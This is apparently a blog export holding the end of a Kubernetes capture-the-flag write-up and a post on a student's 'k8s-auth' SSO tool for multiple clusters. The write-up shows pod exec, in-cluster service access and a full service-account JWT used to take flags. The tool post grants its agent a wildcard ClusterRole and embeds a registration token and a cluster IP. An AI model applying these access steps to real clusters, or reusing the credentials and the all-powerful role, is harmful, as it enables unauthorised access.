KUBECONFIG=ncsc-k8s.conf</span><br><span class=\"line\">$ kubectl get pods -n task2 </span><br><span class=\"line\">NAME      READY   STATUS    RESTARTS        AGE</span><br><span class=\"line\">web-app   1/1     Running   3 (2d19h ago)   17d</span><br></pre></td></tr></table></figure>\n<p>Bingo !! We got access and everything is ok until now. Let’s describe the pod and check what we have first before getting a shell !</p>\n<figure class=\"highlight bash\"><figcaption><span>describe pod</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl describe pod web-app -n task2   </span><br><span class=\"line\">Name:             web-app</span><br><span class=\"line\">Namespace:        task2</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">    Mounts:</span><br><span class=\"line\">      /etc/nginx/flag.txt from flag-configmap (rw,path=<span class=\"string\">&quot;flag.txt&quot;</span>)</span><br><span class=\"line\">      /var/cache/nginx from tmpfs-2 (rw)</span><br><span class=\"line\">      /var/run from tmpfs-1 (rw)</span><br><span class=\"line\">      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-wrfpc (ro)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>Wow there is  <code>flag.txt</code>  file inside the pod! Let’s be more accurate! The flag is in  <code>/etc/nginx/flag.txt</code></p>\n<p>Let’s get a shell or run a command from the pod using the  <code>kubectl exec</code>  command!</p>\n<p><img data-src=\"https://imgur.com/6QTqehO.png\" alt=\"\"></p>\n<p>Yes we got the flag! And another message: Your current token is enough!</p>\n<blockquote>\n<p>I tried to delete the flag! But as expected the author make the pod Read-only file system</p>\n</blockquote>\n<p>Flag :  <code>Securinets&#123;Ex3c_1s_DAnGer0uS_B3_C4r3fUL&#125;</code></p>\n<h2 id=\"kubernetes-hidden\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-hidden\">#</a> Kubernetes: Hidden? :</h2>\n<p>We still have the same token! Our kubectl works fine. So no worries we can do it!</p>\n<p><img data-src=\"https://imgur.com/1Eny78d.png\" alt=\"\"></p>\n<p>In this challenge the flag is hidden?? But how!? Let’s check first what can we do in our  <code>task3</code>  namespace</p>\n<figure class=\"highlight bash\"><figcaption><span>service</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl get service -n task3        </span><br><span class=\"line\">NAME      TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE</span><br><span class=\"line\">web-app   ClusterIP   10.109.128.98   &lt;none&gt;        80/TCP    17d</span><br></pre></td></tr></table></figure>\n<p>We can access to services! In case you don’t know what is service I recommend to check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvc2VydmljZXMtbmV0d29ya2luZy9zZXJ2aWNlLw==\">page</span>. As we understand, There is a pod inside task3 namespace but we don’t have any access to it 😦!. No worries we still have services! This service as we can see its attached to that pod. Let’s get our flag!</p>\n<p>After a little bit of thinking, I got an idea! Let’s access to the service from our previous pod!</p>\n<p>YES MAN! pods and services can communicate between each others</p>\n<p><img data-src=\"https://imgur.com/uq3xAoV.png\" alt=\"\"></p>\n<p>Ok let’s do it then, we have the service internal IP and we can run curl command inside our previous pod!</p>\n<p><img data-src=\"https://imgur.com/DuPq2Sp.png\" alt=\"\"></p>\n<p>Bingo! Flag:  <code>Securinets&#123;K8s_S3rV1cEs_ArE_P0wErFull&#125;</code> <br>\nAnd as Usual! another token for the next challenge :</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In The Next Challenge You will Need This one!</span><br><span class=\"line\"> eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJuY3NjLXBhcnRpY2lwYW50LXRva2VuLTdnZ2JxIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6Im5jc2MtcGFydGljaXBhbnQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwNmM3OGJhZC01NjAwLTQ2N2QtYjdhYi0wNWQzN2RjMjg0MzIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazQ6bmNzYy1wYXJ0aWNpcGFudCJ9.exWa8skN0HdscxzG2PBFYn9eU9l_sL7hAjUw8sFPsnjUKHPHzmqwDpN4WfSPCHFOfv7KKimYvr9SuMjB75KuapxXKnyBwEaIZEkH3c0lavBCPYfGou_BrVsAHVSdbw6pQ9YYonuc3WTiGkcXC-XjKXfY8PGppmnGh7gUsuxY9xwpju10PutjIs8s0g9z2tTBYUhOraa54WRCODDGw-o415rXsaVHuV8A2Cj3jQZVBzXXi5-snfvjX27-nMyGDh4F0gu8sXD3PZfLjLdrOQpP6s_jzbUN9G1g8iLQTXNjCvgUw2cnBOvWtRGLtbdizOazlKUyJAOSXfmu3W45bMJPOg</span><br></pre></td></tr></table></figure>\n<h2 id=\"kubernetes-special\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-special\">#</a> Kubernetes: Special :</h2>\n<p>After getting the new token it’s time to edit the kubeconfig file! Just replace the old toke by the new one! To work with kubectl correctly!</p>\n<p><img data-src=\"https://imgur.com/iFClk1V.png\" alt=\"\"></p>\n<p>Something Special?? What a special? Everything in Kubernetes is SO Special!! So no worries, We can deal with that kind of things!</p>\n<p>Talking about something special take me to think about what we can call it  <code>Custom Resources Definition</code>  in Kubernetes!</p>\n<p>In Kubernetes, a custom resource is an extension of the Kubernetes API that allows you to define your own custom resources with their own custom controllers.</p>\n<p>A custom resource definition (CRD) is used to create a new custom resource type in Kubernetes. A CRD defines the structure and behavior of the new custom resource, including its name, attributes, and API endpoints. Once a CRD is defined, instances of the custom resource can be created and managed using Kubernetes tools like kubectl and the Kubernetes API.</p>\n<figure class=\"highlight bash\"><figcaption><span>api-resources</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl api-resources</span><br><span class=\"line\">NAME                              SHORTNAMES                                      APIVERSION                             NAMESPACED   KIND</span><br><span class=\"line\">bindings                                                                          v1                                     <span class=\"literal\">true</span>         Binding</span><br><span class=\"line\">componentstatuses                 cs                                              v1                                     <span class=\"literal\">false</span>        ComponentStatus</span><br><span class=\"line\">configmaps                        cm                                              v1                                     <span class=\"literal\">true</span>         ConfigMap</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">rolebindings                                                                      rbac.authorization.k8s.io/v1           <span class=\"literal\">true</span>         RoleBinding</span><br><span class=\"line\">roles                                                                             rbac.authorization.k8s.io/v1           <span class=\"literal\">true</span>         Role</span><br><span class=\"line\">priorityclasses                   pc                                              scheduling.k8s.io/v1                   <span class=\"literal\">false</span>        PriorityClass</span><br><span class=\"line\">ncscctfs                                                                          securinets.com/v1alpha1                <span class=\"literal\">true</span>         NCSCCtf</span><br></pre></td></tr></table></figure>\n<p>But wait! I am right! There is an api-group and a custom resource called ncscctfs!</p>\n<p>Now it’s time to get the flag!</p>\n<figure class=\"highlight bash\"><figcaption><span>get</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl get ncscctfs -n task4           </span><br><span class=\"line\">NAME   AGE</span><br><span class=\"line\">flag   17d</span><br></pre></td></tr></table></figure>\n<p>And yes there is a ncscctf resource named flag! Let’s describe that thing and get the flag!</p>\n<figure class=\"highlight bash\"><figcaption><span>describe</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl describe ncscctfs flag -n task4 </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://imgur.com/DhelAJU.png\" alt=\"\"></p>\n<p>Flag:  <code>Securinets&#123;CuSt0m_REs0urcEs_ArE_P0wErFul&#125;</code></p>\n<h1 id=\"final-words\"><a class=\"markdownIt-Anchor\" href=\"#final-words\">#</a> Final Words</h1>\n<p>In conclusion, the success of this event and competition is due in no small part to the dedication and hard work of the technical team. Their expertise and professionalism were instrumental in overcoming the various challenges we faced throughout the event lifecycle, and their tireless efforts ensured that we delivered a product that met the highest standards of quality and performance. On behalf of the team, I would like to express our sincere gratitude to our technical colleagues for their unwavering commitment to the project, and for their invaluable contributions to its success</p>\n"},{"title":"SSO-based authentication","date":"2023-04-28T10:29:37.000Z","cover":"https://kruschecompany.com/wp-content/uploads/2019/08/01-1280x595.png","_content":"# Introduction \n\n## How it comes\nAs a university student, I was assigned to create an authentication project for a specific system. But instead of choosing a traditional approach like Kerberos, I decided to spice things up and bring Kubernetes and cloud-native technologies into the mix (Typical Me). After diving into the official documentation, I was hit with a barrage of authentication strategies like X509 client certs, Static Token File, Bootstrap tokens, Service Accounts, OIDC tokens, and more. My head was spinning! Then I stumbled upon some existing authentication tools like Dex, Keycloak, and Pinniped. Terms like OIDC and OAuth2 were thrown around left and right. But I wasn't intimidated! I accepted the challenge and declared: \"It's implementation time!\" And thus, the k8s-auth project was born.\n\n\n## Why k8s-auth is born   \n\nManaging access to Kubernetes clusters can be a challenging task, especially in large organizations where multiple teams and users need different levels of permissions. While Kubernetes provides a robust RBAC system, configuring and maintaining it can be time-consuming and error-prone, particularly if you have many clusters to manage.\nIt can feel like you're playing a never-ending game of whack-a-mole, trying to keep up with the constant changes and updates. And let's be honest, it's not the most exciting task in the world. Moving from one cluster to another, constantly changing contexts, generating kubeconfig for users, and dealing with permission problems can quickly become a chore. \n\n![](https://imgur.com/a5zaVhH.png)\n\n## Before Starting\n\nBefore you start reading this blog post, let's make sure you're ready to dive into the k8s-auth server world. First, make sure you have a solid understanding of Kubernetes basics and RBAC, as we'll be building on those concepts. Don't worry, we won't ask you to explain any Kubernetes concept in binary code. We just need you to understand what a service account is, what roles and role bindings mean, and why a service account needs a secret. So, if these concepts are still a mystery to you, go ahead and brush up on your Kubernetes knowledge before jumping in. And if you need a refresher, don't worry, we won't judge you. We'll just send you back to Kubernetes school.\n\n# K8S-AUTH : The SSO-Based Authentication Mechanism for Multi-Clusters!\n\n## What is k8s-auth ?\n\nK8s-auth is a tool that provides authentication and authorization mechanisms for multiple Kubernetes clusters. With k8s-auth, users can authenticate to multiple clusters using a single set of credentials. This eliminates the need for users to have different credentials for different clusters, simplifying the authentication process. K8s-auth also allows administrators to manage user and group permissions across multiple clusters from a single centralized location, making it easier to maintain security and access control.\n\n![](https://imgur.com/awkZvAb.png)\n\n\n## The Authentication server\n\n\"K8s-Auth Server\" is an open-source authentication server designed to simplify the authorization and authentication process for users and groups within specific Kubernetes clusters. With this server, administrators can easily manage access controls for multiple clusters, all from a centralized location. \n\n\nWith the k8s-auth server, you can say goodbye to the headache of managing RBAC configurations across multiple clusters. Instead, you can focus on the fun part of being an admin - creating users, deleting users, modifying users, creating groups, deleting groups, modifying groups, and more! And the best part? You get to do it all with a single set of credentials, like a master key that unlocks all the doors to the kingdom of Kubernetes.\n\nBut wait, there's more! With SSO-based access, users can connect to multiple clusters with different permissions based on their role on each cluster, all without having to enter a password a million times. It's like having a backstage pass to all the coolest Kubernetes events without ever having to wait in line.\n\n## How This Server Communicate with Clusters ?\n\nK8s-Auth Server is designed to work seamlessly with K8s-Auth Controller, a cloud-native application that is deployed within the Kubernetes cluster. This controller acts as an agent for the server, facilitating communication between the server and the cluster.\n\n\n![](https://imgur.com/0PK9Sj5.png)\n\nBefore a cluster can be used with K8s-Auth Server, it must be registered with the server by the administrator. When a cluster is registered, a secret token is created, which must be used by the agent/controller deployed within the cluster to verify its existence. Once the agent/controller is verified, a connection between the cluster and the server is opened (web socket) for data communication. \n\n\n![](https://imgur.com/F1EVKK3.png)\n\n## How to interact with this Server\n\nK8s-Auth Server comes with a powerful CLI utility that can be used by both administrators and users. The CLI behaves differently based on the user's role - administrators can create, modify, and delete users, groups, and clusters, while normal users can check the clusters that they are authorized to connect with. Once the users selects the cluster they want to authenticate with, the CLI will automatically generate a kubeconfig file, making it easy for users to connect to the cluster and start working. \n\n## How users logs to the server\n\nTo connect to any cluster, users must first authenticate with the K8s-Auth Server. Authentication with the server is done using OAuth2 with Google, allowing users to use one set of credentials to connect to multiple clusters with different permissions based on their role on each cluster. This type of authentication can be referred to as SSO-based authentication. \n\n## What happen when user want to authenticate to a cluster ?\n\nOn the user side, when a user logs into the K8s-Auth Server, they can check the clusters they are authorized to access. After selecting the desired cluster, a request is sent to the server, which checks if the user is authorized to connect. If authorized, the server sends a request to the specific agent/controller, which creates the necessary Kubernetes resources, such as service accounts, roles, role bindings, and secrets, allowing the user to connect to the cluster and return the token and ca.crt that allow the automatic generation of the kubeconfig. \n\n## The Agent/Controller role \n\nThe agent/controller also manages the lifecycle of the secret and token, deleting them and all related roles and bindings after they expire or are no longer needed. For example, if an administrator decides to remove a user from a cluster, the agent/controller will delete the secret that holds the user's token, as well as the service account, roles, and bindings associated with that user. \n\n## Before DEMO \n\n\n> Please note that this project is open source and the code is available to anyone interested. It is currently an MVP version that functions effectively, and we plan to add more features in the future.\n\n\n\n> Don't forget that this project is open to contributions from the community! If you find a bug or have a feature request, feel free to open an issue on the project's GitHub page. And if you're interested in helping out with the development, pull requests are always welcome! Let's work together to make this project even better.\n\n\n\n{% links %}\n- site: k8s-auth-server\n  url: https://github.com/Mohamed-Rafraf/k8s-auth-server\n  desc: The authentication server \n  image: https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\n  color: \"#2296fd\"\n- site: k8s-auth-kube\n  desc: The Controller/Agent for k8s-auth\n  url:  https://github.com/Mohamed-Rafraf/k8s-auth-kube\n  image: https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\n  color: \"#de2336\"\n- site: k8s-auth-cli\n  desc: The CLI utility for k8s-auth\n  url: https://github.com/Mohamed-Rafraf/k8s-auth-cli\n  image: https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\n  color: \"#02bf1b\"\n{% endlinks %}\n\n# The DEMO ! \n\nAnd the icing on the cake? I am going to show you how to set up and use k8s-auth in a demo that will blow your mind (in a good way, of course). So grab your popcorn and let's get this Kubernetes party started!\n\nLadies and Gentlemen, it's showtime! Let's get ready to k8s-authenticate! We'll be putting the spotlight on three stars of this demo: The Authentication Server, The Agent/Controller, and the Command Line Utility! These babies were born to shine in the Go language (talk about power!) and are all open-source, so you can check them out on my GitHub page. And, to make things even easier, we've containerized the authentication server and agent, so you can just pull them like a cold one on a hot summer day. Check out my Docker Hub profile for more juicy details!\n\n## Setting up Authentication Server\n\nHold your horses, folks! The authentication server may be containerized, but it's not going inside Kubernetes! Don't forget to set up those environment variables for the server - especially the admin email! (He deserve a name and a full name too, don't they?) And guess what, the admin can log in with Google OAuth2! Just make sure to give the Client ID, Client Secret, and Redirection Link, or else things won't work too smoothly.\n\n> You need to create an OAuth 2.0 Client with the Google API in google cloud platform!\n\n![](https://imgur.com/YqhD79J.png)\n\n* `K8S_AUTH_ADMIN_NAME`: The administrator name! (My name is default value)\n* `K8S_AUTH_ADMIN_FULLNAME`: The administrator name! (My name is default value)\n* `K8S_AUTH_ADMIN_MAIL`: The administrator name! (My email is default value)\n* `OAUTH2_CLIENT_ID`: The google Oauth2 Client ID (Required)\n* `OAUTH2_CLIENT_SECRET`: The google Oauth2 Secret  (Required)\n* `OAUTH2_REDIRECT_URL`: The google Oauth2 Redirect URL callback (Required, it must be redirected to /callback endpoint of your server ) \n\n> Let's assume that the server is deployed on https://auth.4n6nk8s.tech,\n`OAUTH2_REDIRECT_URL` must be https://auth.4n6nk8s.tech/callback\n\nIt's docker time! `mohamedrafraf/k8s-auth-server` is the docker image that you need! Let's run this server! \n\n```bash run server\ndocker run --name server -it -p 80:8080 -e OAUTH2_CLIENT_ID=xxxx -e OAUTH2_CLIENT_SECRET=xxx ... mohamedrafraf/k8s-auth-server\n```\n\n\nMake sure to input all the necessary variables for the server to run smoothly. And once you've done that, sit back and relax, and let the server do its thing! Keep your hands off those logs, let them flow in peace!\n\n## Interacting with server using k8s-auth CLI \n\nIt's CLI installation time, folks! This nifty command line utility is your ticket to the k8s-auth party. With the CLI, you can log in as an admin or regular user and interact with the server based on your permission level.\n\nBut wait, there's more! For the first time, only the admin with their fancy schmancy email address can access the server. They'll be the ones registering the cluster, setting up the agent, and creating a connection between the server and the agent. Then, it's time to have some fun with users, groups, and permissions. Who said authentication couldn't be funny?\n\nYou can build the command line utility or download it by running: \n```bash download cli\nwget https://github.com/Mohamed-Rafraf/k8s-auth-cli/releases/download/test/k8s-auth\nsudo chmod +x k8s-auth && sudo mv k8s-auth /usr/bin\n```\nNow, you can use this command line utility just like any other tool in your system! \n\n![](https://imgur.com/EciPajC.png)\n\n\nBefore start playing with this command line you need to know that on each command you need to specify the authentication server that you want to interact with! So either you user `--server` on each command or use `K8S_AUTH_SERVER` environment variable to make it more easy for you! I'll go with the 2nd option!\n\n```bash export env var\nexport K8S_AUTH_SEVER=https://auth.4n6nk8s.tech\n```\n\nNow you need to log in as an adminstrator! It's not that hard just run `k8s-auth login` and forget to specify `--admin` to login as the super user!\n\n![](https://imgur.com/10prjzn.png)\n\nThe utility needs a secret token, which you'll get from an URL link. This link will take you to Google for authentication and authorization as an admin. Once you're authorized, you'll get the secret token to paste and everything will be good to go. \n\nYou'll get something like this one in case you're authorized! \n![](https://imgur.com/Yt9FZgD.png)\n\nCopy that thing don't worry! Once you paste it, the utility will verify the token and let you know if you're ready for your actions or not! \n\n![](https://imgur.com/MY7TTOZ.png)\n\nBingo we are ready for action! Now as an admin you can register clusters, create,delete,modify users and groups (and their permissions) inside each cluster!\n\n> Let's assume that you have 2 clusters! You create a user inside cluster1 and you give him permission to list pods on dev namespace. You can add that user to cluster2 with other permission like create secrets on prod namespace\n\nIt's time to register a cluster! You'll recieve a secret token.\n\n![](https://imgur.com/yvANfkB.png)\n\nAnd as you see here! The cluster is registered using `k8s-auth create cluster` and you can list registred clusters with `k8s-auth get clusters`\n\n> Keep in mind that registerd cluster have 2 status, not Active when the cluster is not verified yet. The Active status will show you the API SERVER address/hostname\n\n> Only Admins can see the tokens! Running the same command as a regular user will list you only the clusters that you have access to it (so not all cluster) and without the token! \n\nLet's take rest now from the CLI. It's time for kubernetes! Let's deploy the agent/controller that will communicate with the server! \n\n## Deploy the Agent/Controller inside Kubernetes\nDeploying the agent is not rocket science! Deploying the agent is not rocket science! (To be honest i didn't make a helm chart yet, Sadly :( ). But if you want to do it the old fashioned way, no worries! It's still a piece of cake. Just keep in mind that you need to create a namespace called \"k8s-auth\" in your cluster. This namespace will contain all the service accounts and secrets of the users that authenticate and have a session with the cluster.\n\nThe agent's mission is to make sure everyone gets what they need! It creates service accounts, roles, and role bindings to make sure users have the right permissions in the cluster. That's why the agent itself needs a service account and permissions to do its job inside the cluster.\n\n\nLet's create the namespace and the service account for this agent! \n\n```yaml create ns & sa\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: k8s-auth\nspec: {}\nstatus: {}\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: k8s-auth\n  namespace: k8s-auth\n```\n\nThis service account need a clusterrole that allow to create roles to anything!  to grant permission for creating pods you must have this permission first! You can't give permission of create something and you can't do it!!! \n\nNext, the service account will need an appropriate permissions to carry out its mission inside the cluster. Specifically, it requires a clusterrole that grants permission to create roles for any resource. \n\nIn kubernetes world, granting permission to create something requires that you have the permission yourself!. For example, you can't grant permission to create pods if you don't have permission to create pods even you have permission to create roles!!\n\nLet's create the clusterole and the binding! \n\n````yaml create cluster role\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  creationTimestamp: null\n  name: k8s-auth\nrules:\n- apiGroups: [\"*\"]\n  resources: [\"*\"]\n  verbs: [\"*\"]\n\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  creationTimestamp: null\n  name: k8s-auth\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: k8s-auth\nsubjects:\n- kind: ServiceAccount\n  name: k8s-auth\n  namespace: k8s-auth\n````\nNow it's time to the last part! we will deploy the agent itself! The agent need to know some information so as expected there is some environement variable! \n\n* `CLUSTER_NAME`: is the same name that you put it inside the authentication server \n* `TOKEN`: The generated token from the authentication server\n* `SERVER`: The authentication server itself\n* `API_SERVER`: This is contains the public hostname for the API SERVER. The agent can detect it correctly when you have a cluster inside Network and the cluster is not exposed in the internet \n\n> I used kubeadm clusters in provisionning clusters. I didn't find a way to find the public hostname! So you need to indicate the api server until it will be fixed!\n\n```yaml deploy\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  creationTimestamp: null\n  labels:\n    app: k8s-auth\n  name: k8s-auth\n  namespace: k8s-auth\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-auth\n  strategy: {}\n  template:\n    metadata:\n      creationTimestamp: null\n      labels:\n        app: k8s-auth\n    spec:\n      serviceAccountName: k8s-auth\n      containers:\n      - image: mohamedrafraf/k8s-auth-kube \n        name: k8s-auth-kube\n        env:\n          - name: CLUSTER_NAME\n            value: ctf-cluster\n          - name: TOKEN\n            value: \"Z8taw1yFw4lsq7cgSvmZ\"\n          - name: SERVER\n            value: \"https://auth.4n6nk8s.tech\"\n          - name: API_SERVER\n            value: https://172.190.91.84:6443\n        resources: {}\n\nstatus: {}\n```\n\nAfter deploying the agent. you can check the clusters with the cli again and you'll find everything is ok! \n![](https://imgur.com/MqHeeY1.png)\n\nThe cluster is on Active status and the api server is not empty now! You can repeat this operation with many clusters and this is how multi-clusters can work together! \n\n## Create Users and Groups \n\nThe cluster is now ready for authentication and has been verified to be functioning without any issues. The connection between the cluster and authentication has been established. Now, let's proceed to creating groups and users.\n\nLet's see what `k8s-auth create` can do for us! \n\n![](2023-04-29-15-56-38.png)\n\nGreat news! With the `k8s-auth create` command, you can easily create groups and users for your authenticated clusters. To create a group, simply specify the cluster and provide a YAML manifest file containing the roles for that group. For creating a user, you can either assign them to an existing group or provide a YAML manifest file for the user's roles if they do not belong to any group.\n\nLet's define the role for our group that we will create!\n\n```yaml group rule\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  namespace: dev\n  name: pod-and-secret\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\",\"secrets\"]\n  verbs: [\"list\",\"create\"]\n\n---\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  namespace: prod\n  name: pod-list\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"list\"]\n``` \n\nThe group we're about to create will be granted permission to create and list pods and secrets in the \"dev\" namespace, while they will only be able to list pods in the \"prod\" namespace.\n\n> Any user will be belong to this group will have these permissions! You don't have to repeat the same manifest for each user!. This is why groups exists! \n\nThis command will create the group for you \n```bash command\nk8s-auth create group <name> --cluster=<cluster> --file=<rbac_file>\n```\n![](https://imgur.com/g5YBB8u.png)\n\nAs you can see here! The group is create successfully and you can see his permission when you forget it using `k8s-auth get permission` command! \n\nYou can discover what you can do with `k8s-auth get` command!! You can a list users too! \n\n![](https://imgur.com/MOC7L1o.png)\n\nNow let's create a user that belong to this group! So we don't need to specify any manifest file that define roles! \n\n```bash user\nk8s-auth create user --name <name> --fullname <value> --mail <mail> --cluster <cluster> --group <group>\n```\n\nIn case that you want to create a user that don't belongs to any group and have his own permission you can delete the `--group` and change it with `--file` and specify the yaml file that contains his roles! \n\n> No need to worry about naming roles because there won't be any overlapping between them. The agent takes care of creating roles and bindings in the background, and the names you specify in the manifest won't be used directly.\n\n![](https://imgur.com/n2S8BQM.png)\n\nYou can update the permission using the `k8s-auth update permisssion` command! This command can update groups and users permission\n\nIn case you change the permission for a user that belgons to a group. This user will leave that group because he will have his own permissions (different from the group one)\n\n\n> You can't delete a group if is not empty!\n\n> When User have an opened session with a cluster and use kubectl normally and you decide to delete that user the session will be closed and he can't do anything! \n\n## Authenticate to a cluster\n\nAs a regular user you need to login to the authentication server using `k8s-auth login` and you'll receive a link as the admin login process! \n\nThen you can list the clusters that you can authenticate with using `k8s-auth get clusters` and keep in your mind that you'll never see the token of each cluster (Only admins can see tokens)\n\nOnce you decided which cluster you'll authenticate! run the command `k8s-auth auth` with specifying the cluster name!\n\n```bash authenticate\nk8s-auth auth cluster=ctf-cluster\n\nTo use this cluster run this command: export KUBECONFIG=$HOME/.k8s-auth.config\n```\n\nIf you're authorized, you'll receive a message like that! What is happening? \n\nActually the k8s-auth CLI generate a kubeconfig file for you! run the command that the CLI suggest to you! BOOOM Start Kubectlying !!! xD \n\n\n## Conclusion\n\nAs highlighted in the blog post, the process of authentication has been simplified with just 3 simple commands - login, auth, and export KUBECONFIG. These commands enable users to easily open a session with any cluster they want, regardless of the number of clusters and different permissions required, using just a single set of credentials. Additionally, the administrator can easily set up agents in the clusters, and manage the permissions and the entire process centrally using a smooth command line interface.","source":"_posts/Kubernetes/k8s-auth.md","raw":"---\ntitle: SSO-based authentication \ndate: 2023-04-28 11:29:37\ntags:\ncover: https://kruschecompany.com/wp-content/uploads/2019/08/01-1280x595.png\ncategories:\n- [Kubernetes]\n#https://miro.medium.com/max/1400/0*E6s0y6uIDi9X68XB.png\n---\n# Introduction \n\n## How it comes\nAs a university student, I was assigned to create an authentication project for a specific system. But instead of choosing a traditional approach like Kerberos, I decided to spice things up and bring Kubernetes and cloud-native technologies into the mix (Typical Me). After diving into the official documentation, I was hit with a barrage of authentication strategies like X509 client certs, Static Token File, Bootstrap tokens, Service Accounts, OIDC tokens, and more. My head was spinning! Then I stumbled upon some existing authentication tools like Dex, Keycloak, and Pinniped. Terms like OIDC and OAuth2 were thrown around left and right. But I wasn't intimidated! I accepted the challenge and declared: \"It's implementation time!\" And thus, the k8s-auth project was born.\n\n\n## Why k8s-auth is born   \n\nManaging access to Kubernetes clusters can be a challenging task, especially in large organizations where multiple teams and users need different levels of permissions. While Kubernetes provides a robust RBAC system, configuring and maintaining it can be time-consuming and error-prone, particularly if you have many clusters to manage.\nIt can feel like you're playing a never-ending game of whack-a-mole, trying to keep up with the constant changes and updates. And let's be honest, it's not the most exciting task in the world. Moving from one cluster to another, constantly changing contexts, generating kubeconfig for users, and dealing with permission problems can quickly become a chore. \n\n![](https://imgur.com/a5zaVhH.png)\n\n## Before Starting\n\nBefore you start reading this blog post, let's make sure you're ready to dive into the k8s-auth server world. First, make sure you have a solid understanding of Kubernetes basics and RBAC, as we'll be building on those concepts. Don't worry, we won't ask you to explain any Kubernetes concept in binary code. We just need you to understand what a service account is, what roles and role bindings mean, and why a service account needs a secret. So, if these concepts are still a mystery to you, go ahead and brush up on your Kubernetes knowledge before jumping in. And if you need a refresher, don't worry, we won't judge you. We'll just send you back to Kubernetes school.\n\n# K8S-AUTH : The SSO-Based Authentication Mechanism for Multi-Clusters!\n\n## What is k8s-auth ?\n\nK8s-auth is a tool that provides authentication and authorization mechanisms for multiple Kubernetes clusters. With k8s-auth, users can authenticate to multiple clusters using a single set of credentials. This eliminates the need for users to have different credentials for different clusters, simplifying the authentication process. K8s-auth also allows administrators to manage user and group permissions across multiple clusters from a single centralized location, making it easier to maintain security and access control.\n\n![](https://imgur.com/awkZvAb.png)\n\n\n## The Authentication server\n\n\"K8s-Auth Server\" is an open-source authentication server designed to simplify the authorization and authentication process for users and groups within specific Kubernetes clusters. With this server, administrators can easily manage access controls for multiple clusters, all from a centralized location. \n\n\nWith the k8s-auth server, you can say goodbye to the headache of managing RBAC configurations across multiple clusters. Instead, you can focus on the fun part of being an admin - creating users, deleting users, modifying users, creating groups, deleting groups, modifying groups, and more! And the best part? You get to do it all with a single set of credentials, like a master key that unlocks all the doors to the kingdom of Kubernetes.\n\nBut wait, there's more! With SSO-based access, users can connect to multiple clusters with different permissions based on their role on each cluster, all without having to enter a password a million times. It's like having a backstage pass to all the coolest Kubernetes events without ever having to wait in line.\n\n## How This Server Communicate with Clusters ?\n\nK8s-Auth Server is designed to work seamlessly with K8s-Auth Controller, a cloud-native application that is deployed within the Kubernetes cluster. This controller acts as an agent for the server, facilitating communication between the server and the cluster.\n\n\n![](https://imgur.com/0PK9Sj5.png)\n\nBefore a cluster can be used with K8s-Auth Server, it must be registered with the server by the administrator. When a cluster is registered, a secret token is created, which must be used by the agent/controller deployed within the cluster to verify its existence. Once the agent/controller is verified, a connection between the cluster and the server is opened (web socket) for data communication. 